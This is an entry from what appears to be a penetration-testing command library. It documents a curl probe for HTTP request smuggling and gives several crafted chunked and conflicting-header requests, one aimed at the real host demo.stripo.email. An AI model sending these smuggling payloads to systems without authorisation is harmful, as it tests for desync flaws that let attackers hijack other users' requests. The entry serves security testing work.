---
id: cmd-001
data: >-
  curl -v -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost:
  demo.stripo.email\r\n\r\n" https://demo.stripo.email
tags:
  - http
  - probe
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T09:01:21.515Z'
verified: false
validated: true
submitted: true
---
# Curl HTTP Probe

## Command

```bash
curl -v -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost: demo.stripo.email\r\n\r\n" https://demo.stripo.email
```

## Description

Probes an HTTP endpoint for request smuggling by sending a chunked test request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | No |
| `-H` | Custom header | Yes |
| `-d` | Data payload | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\n\r\n" https://target
```

### Advanced Usage

```bash
curl -v -H "Content-Length: 0" -H "Transfer-Encoding: chunked" -d "payload" https://target
```

## Expected Output

Verbose response showing if smuggling occurred, potentially with desynchronized requests.

## Related

- [[commands/curl-smuggling]]
- [[procedures/Identify-HTTP-Request-Smuggling-Vulnerability]]
